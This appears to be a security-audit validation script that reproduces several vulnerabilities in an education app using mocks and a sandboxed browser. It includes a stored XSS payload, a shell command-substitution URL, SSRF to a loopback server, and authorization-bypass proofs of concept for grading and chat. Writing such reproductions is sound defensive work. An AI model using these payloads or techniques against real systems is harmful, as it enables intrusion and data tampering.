// Isolated vulnerability reproductions. No .env, production DB, mail, or AI calls.
// Run from the repository root: node docs/security/2026-09-22/validate.cjs
const fs = require('node:fs');
const vm = require('node:vm');
const path = require('node:path');
const assert = require('node:assert/strict');
const ts = require('typescript');
const { execFileSync } = require('node:child_process');
const root = path.resolve(__dirname, '../../..');
const results = [];
function load(file, mocks = {}, globals = {}) {
  const exports = {};
  const code = ts.transpileModule(fs.readFileSync(path.join(root, file), 'utf8'), {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 },
  }).outputText;
  const sandbox = {
    exports, Buffer, URL, Request, Response, console,
    require(name) {
      if (Object.hasOwn(mocks, name)) return mocks[name];
      if (name.startsWith('@/')) throw new Error('Unmocked application import: ' + name);
      return require(name);
    },
    ...globals,
  };
  vm.runInNewContext(code, sandbox, { filename: file });
  return exports;
}
function record(name, detail) { results.push({ name, status: 'REPRODUCED', detail }); }
const responses = {
  successResponse: (data, message, status = 200) => ({ status, data, message }),
  errorResponse: (error, status = 500) => ({ status, error }),
};
const enums = load('types/enums.ts');
const request = body => new Request('http://audit.invalid/api', {
  method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body),
});
async function main() {
  // Evaluate actual converter output in a disconnected browser.
  const math = load('lib/utils/math-notation.ts');
  const payload = '<img/src="x"/onerror="window.auditMarker=1">';
  const quiz = load('lib/custom-quiz.ts', {
    '@/lib/db': {}, '@/lib/gamification/award-progress-points': {},
  });
  const validated = quiz.validateCustomQuizPayload({ title: 'Audit', questions: [{
    id: 'q1', text: payload, options: [{ id: 'a', text: 'A' }, { id: 'b', text: 'B' }], correctOptionId: 'a',
  }] });
  const html = math.convertMathToHTML(validated.questions[0].text);
  const browser = await require('playwright').chromium.launch({ headless: true, channel: 'chromium', ...(process.env.AUDIT_BROWSER_PATH ? { executablePath: process.env.AUDIT_BROWSER_PATH } : {}) });
  try {
    const page = await browser.newPage();
    await page.route('**/*', route => route.abort());
    await page.setContent('<div id="target"></div>');
    await page.evaluate(html => { document.querySelector('#target').innerHTML = html; }, html);
    await page.waitForFunction(() => window.auditMarker === 1, { timeout: 3000 });
    record('Stored XSS rendering primitive', { input: payload, output: html, marker: await page.evaluate(() => window.auditMarker) });
  } finally { await browser.close(); }

  // Same URL encoding and shell expansion; replace curl with a harmless printf.
  const url = 'https://example.invalid/$(auditmarker).pdf';
  const safeUrl = encodeURI(decodeURI(url));
  const expanded = execFileSync('/bin/sh', ['-c', `auditmarker() { printf AUDIT; }; printf '%s' "${safeUrl}"`], { encoding: 'utf8' });
  assert.equal(expanded, 'https://example.invalid/AUDIT.pdf');
  record('Admin syllabus shell command substitution', { encoded: safeUrl, expanded });

  // Actual URL helper fetches a loopback HTTP server and accepts a text response.
  const http = require('node:http');
  let hits = 0;
  const server = http.createServer((req, res) => { hits++; res.setHeader('content-type', 'text/plain'); res.end('LOCAL_AUDIT_ONLY'); });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  try {
    const image = load('lib/ai/vision-image.ts', {}, { fetch });
    const result = await image.fetchImageAsBase64(`http://127.0.0.1:${server.address().port}/private`);
    assert.equal(Buffer.from(result.base64, 'base64').toString(), 'LOCAL_AUDIT_ONLY');
    record('SSRF and MIME fallback', { loopbackRequests: hits, acceptedAs: result.mimeType });
  } finally { await new Promise(resolve => server.close(resolve)); }

  const chatQueries = [];
  const chat = load('lib/ai/bot-chat.ts', {
    '@/lib/ai/gemini': {}, '@/lib/ai/vision-image': {},
    '@/lib/ai/bot-guardrails': { classifyQuery: async () => ({ intent: 'blocked', confidence: 1 }), shouldBlockIntent: () => true },
    '@/lib/ai/bot-knowledge': {}, '@/lib/ai/bot-query-parser': {}, '@/lib/ai/bot-structured-data': {}, '@/lib/ai/bot-image-paper': {},
    '@/lib/bot/schema': { getBotSettings: async () => ({ rateLimitPerHour: 10, refusalMessage: 'Audit refusal' }) },
    '@/types/bot': { BOT_QUERY_INTENT: {} }, '@/types/enums': enums,
    '@/lib/db': { db: { query: async (sql, params) => { chatQueries.push({ sql, params }); return { rows: [] }; } } },
  });
  await chat.generateNovaReply({ userId: 'attacker', sessionId: 'victim-session', message: 'Audit' });
  assert(chatQueries.some(q => q.sql.includes('INSERT INTO chat_messages') && q.params[1] === 'victim-session'));
  assert(!chatQueries.some(q => /SELECT.*chat_sessions/s.test(q.sql)));
  record('Chat cross-owner write', { victimWrites: chatQueries.filter(q => q.sql.includes('INSERT INTO chat_messages')).length, ownershipQueries: 0 });

  let rewards = 0, updates = 0;
  const grade = load('app/api/teacher/grade-paper/route.ts', {
    '@/lib/auth-utils': { verifyAuth: async () => ({ userId: 'unaffiliated-teacher', role: enums.UserRole.TEACHER }) },
    '@/types/enums': enums, '@/lib/response-handlers': responses,
    '@/lib/notifications': { createNotification: async () => {} },
    '@/lib/gamification/award-progress-points': { awardStudentProgressPoints: async () => { rewards++; return { pointsAwarded: 60 }; } },
    '@/lib/db': { db: { query: async sql => {
      if (sql.includes('SELECT ea.*')) return { rows: [{ student_id: 'unrelated-student', student_school_id: null, subject: 'Math' }] };
      if (sql.includes('SELECT subjects')) return { rows: [{ subjects: ['Math'], school_id: null }] };
      if (sql.includes('UPDATE exam_attempts')) updates++;
      return { rows: [] };
    } } },
  });
  const gradeBody = { attemptId: 'victim-attempt', grades: { inventedQuestion: { score: 100, maxMarks: 100 } } };
  assert.equal((await grade.POST(request(gradeBody))).status, 200);
  assert.equal((await grade.POST(request(gradeBody))).status, 200);
  record('Null-school grading and replay rewards', { acceptedUnrelatedAttempt: true, updates, rewardCalls: rewards });

  const paperQueries = [];
  const submit = load('app/api/student/generate-paper/submit/route.ts', {
    '@/lib/auth-utils': { verifyAuth: async () => ({ userId: 'attacker', role: enums.UserRole.STUDENT }) },
    '@/lib/notifications': {}, '@/lib/ai/nova-paper2-grade': {}, '@/lib/settings/paper2-grading-mode': {},
    '@/lib/gamification/award-progress-points': { awardStudentProgressPoints: async () => ({ pointsAwarded: 60 }) },
    '@/lib/db': { db: { query: async (sql, params) => {
      paperQueries.push({ sql, params });
      return { rows: sql.includes('FROM generated_papers') ? [{ questions_snapshot: [{ id: 'q1', marks: 1, correctAnswer: 'A' }] }] : [] };
    } } },
  });
  const paperResult = await submit.POST(request({ generatedPaperId: 'victim-paper', subject: 'Forged subject', paperType: 1, answers: {} }));
  const paperBody = await paperResult.json();
  assert.equal(paperBody.data.questionResults.q1.correctAnswer, 'A');
  assert(!paperQueries.some(q => q.sql.includes('FROM generated_papers') && /user_id|student_id/.test(q.sql)));
  record('Generated-paper cross-owner answer disclosure', { status: paperResult.status, disclosedAnswer: paperBody.data.questionResults.q1.correctAnswer });

  let aiCalls = 0;
  const lab = load('app/api/lab/grade/route.ts', {
    '@/lib/response-handlers': responses,
    '@/lib/ai/gemini': { generateGeminiContentWithRetry: async () => { aiCalls++; return { response: { text: () => '{"marks":1,"feedback":"audit"}' } }; } },
  });
  assert.equal((await lab.POST(request({ practical: 'glucose-fehling', observation: 'audit', inference: 'audit' }))).status, 200);
  record('Unauthenticated lab AI invocation', { aiCalls, authorizationHeader: false });

  const limiter1 = load('lib/security/rate-limit.ts');
  const limiter2 = load('lib/security/rate-limit.ts');
  for (let i = 0; i < 5; i++) assert(limiter1.rateLimit('same-account', 5, 900000));
  assert.equal(limiter1.rateLimit('same-account', 5, 900000), false);
  assert.equal(limiter2.rateLimit('same-account', 5, 900000), true);
  record('Independent-worker rate-limit reset', { firstWorkerDenied: true, secondWorkerAllowed: true });
  fs.writeFileSync(path.join(__dirname, 'validation-results.json'), JSON.stringify({ generatedAt: new Date().toISOString(), isolation: 'Mock DB/AI/auth; browser requests blocked; loopback-only HTTP', results }, null, 2) + '\n');
  console.log(JSON.stringify(results, null, 2));
}
main().catch(error => { console.error(error); process.exitCode = 1; });
